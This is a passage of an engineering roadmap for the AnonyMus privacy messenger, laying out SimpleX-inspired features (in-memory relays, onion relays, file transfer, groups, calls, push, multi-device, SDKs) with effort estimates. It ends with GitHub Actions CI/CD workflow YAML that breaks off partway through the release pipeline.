**What it is:** SimpleX's SMP server stores messages in memory, persisting only queue records (not message content). Messages are deleted immediately after delivery.

**Why it matters:** If the server is seized, there is nothing to disclose. SimpleX's 2025 transparency report shows 12 law-enforcement requests and 0 responsive data — because there is no data to respond with.

**How it fits AnonyMus:** The relay's `users` table is replaced by a `queue_records` table (queue address, recipient public key, created_at) — no usernames, no passwords. Auth moves client-side (the local client unlocks the local keystore with a password; the relay never sees a password). Messages are stored in Redis (or an in-memory SQLite table) keyed by queue address, deleted on `pull`. Persistent storage is only for queue records, which are useless without the recipient's private key.

**Implementation approach:**
- New relay schema: `queue_records(queue_addr PRIMARY KEY, recipient_pubkey, created_at)`.
- Redis for in-flight messages (or `:memory:` SQLite if Redis is unavailable).
- Auth: client generates a per-queue keypair locally; the relay only sees the public key.
- Migration: existing `users` table is dropped after a deprecation window.

**Dependencies:** 10.A.1 (per-connection pseudonyms).

**Effort:** 3 weeks
**Target quarter:** Q2

#### 10.C.2 — Self-Hostable Relays (One-Command Install)

**What it is:** SimpleX ships `install.sh` → systemd service; Docker; Linode marketplace one-click. Anyone can run a relay.

**Why it matters:** Decentralization — no single operator can de-anonymize the network. Users can self-host or pick a trusted friend's relay.

**How it fits AnonyMus:** Ship `install.sh` for `curl | bash`-style install on a fresh Linux box. Add a `make self-host` target that generates a `docker-compose.yml` with Caddy + AnonyMus relay + (optional) Tor hidden service. Document on the new transparency page.

**Effort:** 1 week
**Target quarter:** Q2

#### 10.C.3 — Tor Hidden-Service Relay Option

**What it is:** SimpleX relays can be deployed onion-only (no clearnet address).

**Why it matters:** An onion-only relay has no IP address to subpoena. Combined with 10.C.1, the relay is a pure message-routing black box.

**How it fits AnonyMus:** The existing `transports/p2p/tor_manager.py` already knows how to launch a Tor hidden service. Add a `RELAY_AS_ONION=true` mode that runs the relay behind a hidden service instead of on a clearnet port. The relay's `.onion` address is advertised in invite links.

**Effort:** 1 week
**Target quarter:** Q3

#### 10.C.4 — Transparency Page

**What it is:** SimpleX publishes `docs/TRANSPARENCY.md` with annual law-enforcement request counts and the count of responsive data provided (always 0, by design).

**Why it matters:** Trust signal — users can verify that the relay operator has nothing to disclose.

**How it fits AnonyMus:** Add `docs/TRANSPARENCY.md` with the same structure. Since AnonyMus is self-hostable, the page is a template that each relay operator fills in. The official relay (if one exists) publishes real numbers.

**Effort:** 2 days
**Target quarter:** Q3

### 10.D — Messaging Features

#### 10.D.1 — Disappearing Messages

**What it is:** Messages auto-delete after a configurable TTL (30s, 5min, 1h, 1d, 1w) set per conversation.

**Why it matters:** Limits the blast radius if the local DB is compromised.

**How it fits AnonyMus:** Add `disappearing_ttl` column to `connections`. The client sets a timer per message; on expiry, the message is deleted from the local DB and a `delete` event is sent to the peer (who also deletes). The relay never sees the TTL (it is inside the E2E envelope).

**Effort:** 3 days
**Target quarter:** Q2

#### 10.D.2 — Live Messages

**What it is:** A message that updates in place (like a typing indicator that shows the current draft) — the recipient sees the sender typing live.

**Why it matters:** UX feature; also useful for collaborative editing.

**How it fits AnonyMus:** A new `x.msg.live` event type in the message envelope, with a sequence number for in-place updates. The client replaces the previous live message with the new one. On "send", the live message becomes a normal message.

**Effort:** 1 week
**Target quarter:** Q3

#### 10.D.3 — Message Reactions

**What it is:** Emoji reactions on a message (👍, ❤️, etc.).

**Why it matters:** UX feature; expected by modern messenger users.

**How it fits AnonyMus:** A new `x.msg.reaction` event with `target_msg_id` and `emoji`. Stored in a `reactions` table. Rendered inline below the target message.

**Effort:** 3 days
**Target quarter:** Q3

#### 10.D.4 — Edit History

**What it is:** A sender can edit a message after sending; the edit history is preserved (with timestamps).

**Why it matters:** UX feature; also useful for correcting mistakes without losing context.

**How it fits AnonyMus:** A new `x.msg.edit` event with `target_msg_id` and `new_text`. The original message is preserved in an `edits` table; the client renders the latest version with an "edited" indicator that expands to show history.

**Effort:** 4 days
**Target quarter:** Q3

#### 10.D.5 — Full Delete by Sender

**What it is:** The sender can delete a message for both themselves and the recipient (not just "delete for me").

**Why it matters:** Sentimental / privacy — "I should not have sent that."

**How it fits AnonyMus:** A new `x.msg.delete` event with `target_msg_id`. Both clients delete the message. The relay cannot delete (it never stored the content). Document that this is best-effort — the recipient may have already screenshotted or copied.

**Effort:** 2 days
**Target quarter:** Q3

#### 10.D.6 — Delivery Receipts (Opt-Out Per Contact)

**What it is:** "Delivered" and "Read" indicators, with per-contact opt-out.

**Why it matters:** UX feature; the opt-out is a privacy feature (the recipient can choose not to leak read state).

**How it fits AnonyMus:** A new `x.msg.receipt` event with `target_msg_id` and `state` (`delivered` | `read`). The sender's client shows a checkmark. Per-contact opt-out is a `connections.send_receipts` boolean.

**Effort:** 3 days
**Target quarter:** Q3

#### 10.D.7 — Message Batching

**What it is:** SimpleX batches multiple chat events into a single transport block to reduce traffic-analysis surface.

**Why it matters:** Without batching, each event is a separate network round-trip — an adversary can count events. Batching defeats this.

**How it fits AnonyMus:** The client accumulates events for up to 500ms or until the batch reaches 16 KB, whichever comes first, then sends. The recipient unbundles and processes each event.

**Effort:** 1 week
**Target quarter:** Q3

### 10.E — File Transfer (XFTP-Style)

#### 10.E.1 — Chunked Encrypted File Protocol

**What it is:** SimpleX's XFTP protocol chunks files into ≤15,780-byte blocks, E2E-encrypts each chunk, sends them over separate connections (potentially different relays), and reassembles on the recipient. Files up to 1 GB.

**Why it matters:** AnonyMus currently has no file transfer at all. A privacy-preserving file protocol is essential for a modern messenger.

**How it fits AnonyMus:** New module `core/file_transfer.py`. A file is split into chunks, each encrypted with a per-chunk AES-256-GCM key derived from a master file key via HKDF. The chunk descriptions (encrypted) are sent as `x.file.descr` chat messages; the chunks themselves are uploaded to a file relay (which can be the same as the message relay or a separate one). The recipient downloads chunks, decrypts, reassembles. The file relay sees only encrypted blobs.

**Implementation approach:**
- New `x.file.*` event namespace in the chat protocol.
- New `/file/upload/<chunk_id>` and `/file/download/<chunk_id>` endpoints on the relay (in-memory storage, TTL 24h, delete-on-download).
- Client UI: drag-and-drop file attachment, progress bar, thumbnail preview for images.
- Size cap: 1 GB (matching SimpleX); larger files require multiple transfers.

**Dependencies:** 10.C.1 (in-memory storage) so the file relay stores nothing persistently.

**Effort:** 4 weeks
**Target quarter:** Q3 (months 5-6)

#### 10.E.2 — Recipient-Chosen File Relays

**What it is:** The recipient picks which file relay to use for downloading — not the sender. This prevents the sender's relay from correlating file downloads with the recipient.

**Why it matters:** Defense in depth against relay-operator traffic analysis.

**How it fits AnonyMus:** The recipient advertises their preferred file relay in their profile. The sender uploads to that relay. The relay sees only an encrypted blob download.

**Effort:** 1 week (after 10.E.1)
**Target quarter:** Q3

### 10.F — Groups

#### 10.F.1 — Decentralized Groups (Pairwise Queues to Every Member)

**What it is:** SimpleX groups are fully decentralized — no group server. Each member holds pairwise queues to every other member. For an N-member group, each member maintains N-1 queues.

**Why it matters:** No group server means no operator can de-anonymize the group. The group is purely a client-side construct.

**How it fits AnonyMus:** A group is a local collection of pairwise connections (from 10.A.1) with a shared `group_id`. The client fan-outsends each message to all N-1 peers. Group membership changes (join, leave) are signed by the group founder's key. For large groups this is O(N²) connections — cap at 50 members initially, document the limit.

**Implementation approach:**
- New `groups(group_id, founder_pubkey, name, created_at)` table.
- New `group_members(group_id, member_pubkey, invited_by, role, joined_at)` table.
- New `x.grp.*` event namespace.
- Client UI: group creation (select contacts, set name), group invite link, member list, leave group.
- Roles: `founder`, `admin`, `member` — founders can add/remove members; admins can add; members can send.

**Dependencies:** 10.A.1 (per-connection pseudonyms); 10.B.1 (layered E2E per queue).

**Effort:** 4 weeks
**Target quarter:** Q3 (months 5-6)

#### 10.F.2 — Group Links with Rotating IDs

**What it is:** SimpleX group invite links have a `groupLinkId` that is regenerated each time the link is shared, so old links cannot be correlated with new ones.

**Why it matters:** Prevents link-based correlation of group invites across time.

**How it fits AnonyMus:** Each group invite generates a fresh `invite_token = random(16 bytes)`. Old tokens are invalidated after use or after 7 days. The token is in the URL fragment (never sent to server).

**Effort:** 2 days (after 10.F.1)
**Target quarter:** Q3

#### 10.F.3 — Member Roles & Member Relations Vector

**What it is:** Roles (`founder`, `admin`, `member`) and a "member relations" vector that records which members vouch for which others — a trust graph within the group.

**Why it matters:** Helps large groups resist Sybil attacks — a new member vouched for by 3 existing members is more trustworthy than one with no vouching.

**How it fits AnonyMus:** The `group_members.role` column (already in 10.F.1) plus a new `member_vouches(group_id, vouching_member, vouched_member, timestamp)` table. The client shows vouching indicators on each member.

**Effort:** 1 week (after 10.F.1)
**Target quarter:** Q3

### 10.G — Voice/Video (WebRTC)

#### 10.G.1 — E2E WebRTC Audio/Video Calls

**What it is:** SimpleX supports E2E WebRTC audio and video calls, with signalling via the chat protocol (`x.call.*` events).

**Why it matters:** A modern messenger without voice/video is incomplete. WebRTC is E2E by default (DTLS-SRTP), but the signalling must also be E2E (which it is, since it rides the chat E2E).

**How it fits AnonyMus:** Use the `aiortc` library on the server side (for the relay mode — actually, the relay just passes through signalling; the media is P2P between the two clients). For the web client, use the browser's `RTCPeerConnection`. For Android, use Google's `WebRTC` library. Signalling events: `x.call.offer`, `x.call.answer`, `x.call.ice`, `x.call.hangup`. The media flows directly between the two clients (or via a TURN server if NAT requires it — run a `coturn` instance, optionally as a Tor hidden service).

**Implementation approach:**
- New `x.call.*` event namespace.
- Client UI: call button, incoming-call dialog, in-call view with mute/video-toggle/hangup.
- TURN server: `coturn` in `docker-compose.yml` with optional Tor hidden service.
- For P2P mode, the WebRTC media can ride the existing Tor circuit (though latency is high — document this).

**Dependencies:** 10.B.1 (signalling rides the E2E channel).

**Effort:** 5 weeks
**Target quarter:** Q3 (months 5-6)

#### 10.G.2 — Voice Messages

**What it is:** Record a voice clip, send as a file attachment.

**Why it matters:** UX feature; voice messages are extremely popular in many regions.

**How it fits AnonyMus:** Client UI: press-and-hold to record, release to send. The recording is sent via 10.E.1 (file transfer). The recipient sees a play button.

**Effort:** 1 week (after 10.E.1)
**Target quarter:** Q3

#### 10.G.3 — Video Messages

**What it is:** Short video clips, sent as file attachments.

**How it fits AnonyMus:** Same as 10.G.2 but for video. Client records via `MediaRecorder` API, sends via 10.E.1.

**Effort:** 1 week (after 10.E.1)
**Target quarter:** Q3

### 10.H — Push Notifications (Privacy-Preserving)

#### 10.H.1 — Android Background Service (No Google Tokens)

**What it is:** SimpleX's Android app uses a background service for push notifications, not Firebase Cloud Messaging. This avoids Google issuing a per-device token that can correlate the user across apps.

**Why it matters:** FCM tokens are correlated with the Google account on the device. A user who logs out of Google on their device still has the FCM token. A privacy-preserving messenger must avoid FCM.

**How it fits AnonyMus:** The Android app runs a foreground service (with a persistent notification — Android 8+ requirement) that maintains a WebSocket to the relay. On incoming message, the service posts a local notification. The user can disable the foreground service (sacrificing real-time notifications) for battery savings.

**Implementation approach:**
- New `PushService` foreground service in the Android app.
- The service maintains a WS connection to the relay (or, in P2P mode, polls the local server every 30s).
- On message, the service decrypts just enough to show "New message from <contact>" — or, for higher privacy, just "New message" with no sender.
- Battery: use `WorkManager` for periodic keep-alive; use `AlarmManager` for exact-alarm wakeups on Android 12+ (with the `SCHEDULE_EXACT_ALARM` permission).

**Effort:** 3 weeks
**Target quarter:** Q3

#### 10.H.2 — iOS Notification Service Extension (NSE)

**What it is:** SimpleX's iOS app uses APNs (Apple Push Notification service) via a dedicated push server, with a Notification Service Extension that decrypts just enough to show a notification.

**Why it matters:** iOS does not allow background services, so APNs is mandatory. The NSE ensures the decryption key for notifications is separate from the main DB key.

**How it fits AnonyMus:** This requires the iOS client (Section 10.J.1) to exist first. The NSE is a separate Xcode target that runs in response to an APNs push, decrypts the notification payload (using a key derived specifically for notifications, not the main DB key), and displays it. The dedicated push server (run by the relay operator or self-hosted) forwards incoming messages to APNs.

**Dependencies:** 10.J.1 (iOS client).

**Effort:** 3 weeks (after iOS client exists)
**Target quarter:** Q3+ (post-1.0)

#### 10.H.3 — Optional 3rd Queue Address for Notifications

**What it is:** SimpleX supports an optional third queue address per connection, used solely for notification triggers. The main queue is checked infrequently; the notification queue is checked often and contains only a "you have mail" flag.

**Why it matters:** Frequent polling of the main queue leaks timing. Polling a dedicated notification queue (which never contains message content) is cheaper and less leaky.

**How it fits AnonyMus:** Add an optional `notify_queue_addr` to the `connections` table. The client polls this queue every 30s; on non-empty, it pulls the main queue. The notification queue never contains message content — just a single byte.

**Effort:** 1 week
**Target quarter:** Q3

### 10.I — Multi-Device (XRCP-Style)

#### 10.I.1 — Mobile ↔ Desktop Linking via QR + Multicast/Reverse-HTTP

**What it is:** SimpleX's XRCP protocol links a mobile device to a desktop app via QR code + local multicast or reverse-HTTP. The desktop app becomes a remote control for the mobile's core.

**Why it matters:** Users want to type on a desktop but keep the keys on the mobile. XRCP makes the mobile the source of truth and the desktop a thin view.

**How it fits AnonyMus:** The Android app generates a QR code containing a one-time linking token + the mobile's local IP. The desktop app (Section 10.J.2) scans the QR, connects to the mobile over the LAN (or via a reverse-HTTP relay if the LAN is not available). All crypto stays on the mobile; the desktop sends commands and receives rendered output.

**Implementation approach:**
- New `core/xrcp.py` module: protocol for command/response over WebSocket.
- Android: `LinkingActivity` generates QR, starts WS server on a random port.
- Desktop: `LinkingDialog` scans QR, connects, exchanges keys, becomes a remote terminal.
- The linking protocol itself is quantum-resistant (use ML-KEM-768 from 10.B.2).

**Dependencies:** 10.B.2 (PQ for the linking protocol); 10.J.2 (desktop client).

**Effort:** 4 weeks
**Target quarter:** Q3+ (post-1.0)

#### 10.I.2 — Quantum-Resistant Linking Protocol

**What it is:** (Same as the linking protocol in 10.I.1, explicitly PQ-resistant.)

**Effort:** Included in 10.I.1.

### 10.J — Platform & SDKs

#### 10.J.1 — iOS Client (SwiftUI)

**What it is:** A native iOS app using SwiftUI, with a main app + Share Extension + Notification Service Extension (for 10.H.2).

**Why it matters:** iOS is ~28% of the mobile market; without an iOS client, AnonyMus is Android-only.

**How it fits AnonyMus:** SimpleX uses a shared Haskell core via FFI; AnonyMus's core is Python, which is impractical to embed in iOS. Instead, port `core/` to a shared Swift package (or use Rust as a cross-platform core — a bigger architectural decision). The shortest path: re-implement the crypto + protocol layer in Swift, using `CryptoKit` for AES-GCM and HKDF, and a Swift Double Ratchet library. The UI is SwiftUI.

**Implementation approach:**
- New `ios/` directory with an Xcode project.
- `Shared/` Swift package: crypto, protocol, storage (SQLCipher via `SQLite.swift`).
- `AnonyMus/` main app target.
- `ShareExtension/` target for sharing files/text into AnonyMus.
- `NotificationServiceExtension/` target for 10.H.2.

**Dependencies:** 10.B.1 (need a stable protocol spec first); 10.H.2 (NSE).

**Effort:** 8 weeks
**Target quarter:** Q3+ (post-1.0) — likely a 1.1 release

#### 10.J.2 — Desktop Client (Tauri or Electron)

**What it is:** A native desktop app for macOS, Windows, Linux. SimpleX uses Compose Multiplatform (JVM); AnonyMus can use Tauri (Rust + web frontend) or Electron (Node + web frontend) for a smaller effort.

**Why it matters:** Power users want a desktop client; some enterprise deployments require it.

**How it fits AnonyMus:** Reuse the existing `web/` client as the UI, wrap in Tauri (smaller binary, better security model than Electron). The Tauri Rust backend handles local storage (SQLCipher), Tor integration (reuse the existing `tor_manager.py` logic, ported to Rust), and the WS connection to the relay. This desktop client can also be the "remote control" target for 10.I.1.

**Dependencies:** 10.I.1 (multi-device linking).

**Effort:** 5 weeks
**Target quarter:** Q3+ (post-1.0)

#### 10.J.3 — Terminal CLI

**What it is:** A command-line client for scripting, bots, and headless servers.

**Why it matters:** Power users, CI bots, and self-hosters want CLI access. SimpleX ships one.

**How it fits AnonyMus:** The existing `server.py` already runs headlessly. Add a `cli.py` that wraps the transport layer in a REPL (commands: `connect <invite>`, `send <contact> <msg>`, `recv`, `contacts`, `quit`). Reuse the Python crypto + protocol modules directly.

**Effort:** 1 week
**Target quarter:** Q2

#### 10.J.4 — TypeScript SDK

**What it is:** A TypeScript client library (SimpleX ships one in `packages/simplex-chat-client/typescript`).

**Why it matters:** Lets third-party developers build bots, bridges, and alternative UIs on top of AnonyMus.

**How it fits AnonyMus:** Extract `web/static/crypto.js` and the protocol logic into a published `@anonymus/client` npm package. Document the API.

**Effort:** 2 weeks
**Target quarter:** Q3

#### 10.J.5 — Node.js Native SDK

**What it is:** A Node.js SDK with native bindings for performance-critical crypto (SimpleX ships one in `packages/simplex-chat-nodejs`).

**How it fits AnonyMus:** Use N-API to bind the Python `core/` (via `cffi` or a Rust port) to Node.js. Lower priority than 10.J.4 unless performance becomes a bottleneck.

**Effort:** 3 weeks
**Target quarter:** Q3+ (post-1.0)

#### 10.J.6 — Python SDK

**What it is:** A Python client library (SimpleX ships one in `packages/simplex-chat-python`).

**How it fits AnonyMus:** Trivial — AnonyMus is already Python. Publish `core/` as a `pip install anonymus` package.

**Effort:** 1 week
**Target quarter:** Q2

### 10.K — Operational Practices

#### 10.K.1 — RFC Design Log (`docs/rfcs/`)

**What it is:** SimpleX ships 78 dated design RFCs in `docs/rfcs/{date}-{topic}.md`. Each is a short design doc with diagrams.

**Why it matters:** Cheap, hugely improves auditability and onboarding. Every architectural decision is traceable.

**How it fits AnonyMus:** Create `docs/rfcs/` with a template. Backfill RFCs for existing decisions (relay vs P2P, AES-GCM chain ratchet, etc.). Going forward, every non-trivial change requires an RFC merged before code.

**Effort:** 1 week (initial backfill) + ongoing
**Target quarter:** Q1 (start immediately)

#### 10.K.2 — External Crypto Audit

**What it is:** SimpleX commissioned Trail of Bits for two audits (2022, 2024), both published with findings + fixes.

**Why it matters:** Even careful projects ship medium-severity crypto bugs (SimpleX's 2022 audit found an X3DH KDF bug). External review is the only way to catch these.

**How it fits AnonyMus:** Budget $40-80k for a 2-week Trail of Bits or NCC engagement, timed for month 6 after the Q2 architectural upgrades are stable. Publish the findings + fixes.

**Dependencies:** 10.B.1 (DR must be stable); 10.K.1 (RFCs give the auditor a starting point); 10.K.3 (reproducible builds so the auditor can verify the shipped binary).

**Effort:** 0 engineering (just budget + coordination) + 2-4 weeks of fixes post-audit
**Target quarter:** Q3 (month 6)

#### 10.K.3 — Reproducible Builds

**What it is:** SimpleX's server builds are reproducible — anyone can rebuild the binary from source and verify it matches the shipped one. A scheduled CI job verifies this weekly.

**Why it matters:** Defeats insider-developer backdoors. If the build is reproducible, a backdoored binary cannot be shipped without the backdoor being in the source.

**How it fits AnonyMus:** Pin all build dependencies (Python version, pip versions, Docker base image digest). Use `pip-compile` for deterministic `requirements.txt`. The Dockerfile uses `FROM python:3.11-slim@sha256:...` (digest-pinned). A CI job rebuilds from source and compares SHAs with the shipped image.

**Implementation approach:**
- Pin Docker base image by digest.
- Use `pip-compile` for deterministic pip installs.
- New `.github/workflows/reproducible-build.yml` (Section 11).
- Document the verification process in `docs/REPRODUCE.md`.

**Effort:** 2 weeks
**Target quarter:** Q2

#### 10.K.4 — Transparency Reports

**What it is:** (Covered in 10.C.4.)

#### 10.K.5 — Content Moderation (Privacy-Preserving)

**What it is:** SimpleX v6.3+ added privacy-preserving content moderation — users can report abusive messages, and the report is processed without the server seeing the message content.

**Why it matters:** App stores require content moderation for listing. A privacy messenger must do this without breaking E2E.

**How it fits AnonyMus:** A "Report" button on each message. The client sends a report event with the message's hash (not the content) and the reporter's signed attestation. The moderation team can act on cumulative reports (e.g., 5 reports → hide the message in the reporter's clients) without ever seeing the content.

**Effort:** 2 weeks
**Target quarter:** Q3+ (post-1.0)

#### 10.K.6 — Supporter Badges

**What it is:** SimpleX shows a badge for users who donate. Purely cosmetic.

**Why it matters:** Funding mechanism.

**How it fits AnonyMus:** A `supporter_since` timestamp in the local profile (signed by the project's key). Other clients render a badge. No server-side verification needed.

**Effort:** 2 days
**Target quarter:** Q3+ (post-1.0)

#### 10.K.7 — Channels (Broadcast)

**What it is:** SimpleX v6.5 added "channels" — one-to-many broadcast feeds (like Telegram channels).

**Why it matters:** Useful for journalists, newsletters, announcement feeds.

**How it fits AnonyMus:** A channel is a group where only the founder can send; members can only receive. Reuse 10.F.1 with a `role=broadcast` flag.

**Effort:** 1 week (after 10.F.1)
**Target quarter:** Q3+ (post-1.0)

### 10.L — Summary: Feature Integration Effort Matrix

| Feature | Effort | Target Quarter | Dependencies |
|---|---|---|---|
| 10.A.1 Pairwise pseudonyms | 3 weeks | Q2 | 10.B.1, 10.C.1 |
| 10.A.2 Incognito mode | 2 days | Q2 | 10.A.1 |
| 10.A.3 Hidden profiles | 1 week | Q3 | 10.A.1 |
| 10.A.4 Multiple profiles | (in 10.A.3) | Q3 | 10.A.3 |
| 10.B.1 Double Ratchet + NaCl | 4 weeks | Q2 | — |
| 10.B.2 PQ key exchange | 3 weeks | Q3 | 10.B.1 |
| 10.B.3 tlsunique | 2 weeks | Q2 | — |
| 10.B.4 16 KB padding | 1 week | Q2 | — |
| 10.B.5 Safety number | 3 days | Q2 | 10.B.1 |
| 10.C.1 In-memory + delete-on-delivery | 3 weeks | Q2 | 10.A.1 |
| 10.C.2 Self-hostable relays | 1 week | Q2 | — |
| 10.C.3 Tor hidden-service relay | 1 week | Q3 | — |
| 10.C.4 Transparency page | 2 days | Q3 | — |
| 10.D.1 Disappearing messages | 3 days | Q2 | — |
| 10.D.2 Live messages | 1 week | Q3 | — |
| 10.D.3 Reactions | 3 days | Q3 | — |
| 10.D.4 Edit history | 4 days | Q3 | — |
| 10.D.5 Full delete by sender | 2 days | Q3 | — |
| 10.D.6 Delivery receipts | 3 days | Q3 | — |
| 10.D.7 Message batching | 1 week | Q3 | — |
| 10.E.1 XFTP file protocol | 4 weeks | Q3 | 10.C.1 |
| 10.E.2 Recipient-chosen relays | 1 week | Q3 | 10.E.1 |
| 10.F.1 Decentralized groups | 4 weeks | Q3 | 10.A.1, 10.B.1 |
| 10.F.2 Rotating group IDs | 2 days | Q3 | 10.F.1 |
| 10.F.3 Member roles + vouching | 1 week | Q3 | 10.F.1 |
| 10.G.1 WebRTC voice/video | 5 weeks | Q3 | 10.B.1 |
| 10.G.2 Voice messages | 1 week | Q3 | 10.E.1 |
| 10.G.3 Video messages | 1 week | Q3 | 10.E.1 |
| 10.H.1 Android background push | 3 weeks | Q3 | — |
| 10.H.2 iOS NSE | 3 weeks | Q3+ | 10.J.1 |
| 10.H.3 Notification queue | 1 week | Q3 | — |
| 10.I.1 Mobile ↔ desktop linking | 4 weeks | Q3+ | 10.B.2, 10.J.2 |
| 10.J.1 iOS client | 8 weeks | Q3+ | 10.B.1 |
| 10.J.2 Desktop client | 5 weeks | Q3+ | 10.I.1 |
| 10.J.3 Terminal CLI | 1 week | Q2 | — |
| 10.J.4 TypeScript SDK | 2 weeks | Q3 | — |
| 10.J.5 Node.js native SDK | 3 weeks | Q3+ | — |
| 10.J.6 Python SDK | 1 week | Q2 | — |
| 10.K.1 RFC design log | 1 week + ongoing | Q1 | — |
| 10.K.2 External crypto audit | 0 eng + 2-4 wk fixes | Q3 | 10.B.1, 10.K.3 |
| 10.K.3 Reproducible builds | 2 weeks | Q2 | — |
| 10.K.5 Content moderation | 2 weeks | Q3+ | — |
| 10.K.6 Supporter badges | 2 days | Q3+ | — |
| 10.K.7 Channels | 1 week | Q3+ | 10.F.1 |

**Total engineering effort (Q1-Q3, the 6-month roadmap):** ~32 engineer-weeks. With a 2-engineer team, that is 16 weeks of focused work per engineer — feasible in 6 months with buffer. The post-1.0 items (iOS, desktop, multi-device, NSE, Node SDK, moderation, badges, channels) add another ~30 engineer-weeks and are appropriate for a 1.1 release.

---

## 11. CI/CD Pipeline Design

The current repo has zero CI — no `.github/workflows/`, no `.gitlab-ci.yml`, no Jenkinsfile. Tests must be run manually. This section specifies concrete GitHub Actions YAML for six pipelines: Python, Android, JavaScript, reproducible-build verification, SBOM generation, and release. All pipelines run on every PR and on push to `main`.

### 11.1 Python Pipeline

```yaml
# .github/workflows/python.yml
name: Python CI
on:
  pull_request:
  push:
    branches: [main]
    paths:
      - 'core/**'
      - 'transports/**'
      - 'launcher/**'
      - 'tests/**'
      - 'requirements.txt'
      - 'requirements-dev.txt'
      - '.github/workflows/python.yml'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install ruff mypy
      - run: ruff check core/ transports/ launcher/ tests/
      - run: ruff format --check core/ transports/ launcher/ tests/
      - run: mypy core/ transports/ --ignore-missing-imports

  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.11', '3.12']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - run: pip install -r requirements.txt -r requirements-dev.txt
      - run: pytest tests/ --cov=core --cov=transports --cov-report=xml --cov-fail-under=80
      - uses: codecov/codecov-action@v4
        with:
          file: ./coverage.xml
          fail_ci_if_error: false

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install pip-audit bandit safety
      - run: pip-audit -r requirements.txt --strict
      - run: bandit -r core/ transports/ -ll  # fail on Medium+ findings
      - run: safety check --file requirements.txt --output json || true  # advisory

  docker:
    runs-on: ubuntu-latest
    needs: [lint, test, security]
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - run: docker build -f build/Dockerfile -t anonymus:${{ github.sha }} .
      - run: docker run --rm anonymus:${{ github.sha }} python -c "import server; print('boot ok')"
```

### 11.2 Android Pipeline

```yaml
# .github/workflows/android.yml
name: Android CI
on:
  pull_request:
  push:
    branches: [main]
    paths:
      - 'android/**'
      - '.github/workflows/android.yml'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
      - uses: gradle/actions/setup-gradle@v3
      - working-directory: android
        run: ./gradlew testDebugUnitTest --coverage
      - working-directory: android
        run: ./gradlew lintDebug
      - uses: codecov/codecov-action@v4
        with:
          directory: android/app/build/reports/coverage/

  build:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
      - working-directory: android
        run: ./gradlew assembleRelease
      - uses: actions/upload-artifact@v4
        with:
          name: apk-release
          path: android/app/build/outputs/apk/release/*.apk
```

### 11.3 JavaScript Pipeline

```yaml
# .github/workflows/js.yml
name: JS CI
on:
  pull_request:
  push:
    branches: [main]
    paths:
      - 'web/**'
      - '.github/workflows/js.yml'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
        working-directory: web
      - run: npm run lint
        working-directory: web

  test:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
        working-directory: web
      - run: npm test
        working-directory: web
      - run: npm run test:fuzz
        working-directory: web
```

### 11.4 Reproducible Build Verification

```yaml
# .github/workflows/reproducible-build.yml
name: Reproducible Build
on:
  schedule:
    - cron: '0 6 * * 1'  # weekly Monday 06:00 UTC
  workflow_dispatch:

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - name: Build twice and compare SHAs
        run: |
          docker build -f build/Dockerfile -t anonymus:build1 --build-arg BUILDKIT_INLINE_CACHE=1 .
          docker build -f build/Dockerfile -t anonymus:build2 --build-arg BUILDKIT_INLINE_CACHE=1 .
          SHA1=$(docker image inspect anonymus:build1 --format '{{.Id}}')
          SHA2=$(docker image inspect anonymus:build2 --format '{{.Id}}')
          echo "Build 1: $SHA1"
          echo "Build 2: $SHA2"
          if [ "$SHA1" != "$SHA2" ]; then
            echo "FAIL: builds are not reproducible"
            exit 1
          fi
          echo "PASS: builds are reproducible"
      - name: Compare against shipped image
        run: |
          SHIPPED=$(docker pull ghcr.io/aryansinghnagar/anonymus:latest --quiet && docker image inspect ghcr.io/aryansinghnagar/anonymus:latest --format '{{.Id}}')
          FRESH=$(docker image inspect anonymus:build1 --format '{{.Id}}')
          if [ "$SHIPPED" != "$FRESH" ]; then
            echo "WARN: shipped image does not match fresh build (may be different commit)"
          fi
```

### 11.5 SBOM Generation

```yaml
# .github/workflows/sbom.yml
name: SBOM
on:
  push:
    branches: [main]
    paths:
      - 'requirements.txt'
      - 'android/gradle/libs.versions.toml'

jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install cyclonedx-bom
      - run: cyclonedx-py -i requirements.txt -o sbom-python.json --format json
      - uses: actions/upload-artifact@v4
        with:
          name: sbom-python
          path: sbom-python.json
      # Android SBOM via gradle plugin
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
      - working-directory: android
        run: ./gradlew cyclonedxBom
      - uses: actions/upload-artifact@v4
        with:
          name: sbom-android
          path: android/app/build/reports/sbom.json
```

### 11.6 Release Pipeline

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ['v*']

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      # Build all artifacts
      - run: docker build -f build/Dockerfile -t anonymus:${{ github.ref_name }} .
      - run: docker tag anonymus:${{ github.ref_name }} ghcr.io/aryansinghnagar/anonymus:${{ github.ref_name }}
      - run: docker tag anonymus:${{ github.ref_name }} ghcr.io/aryansinghnagar/anonymus:latest
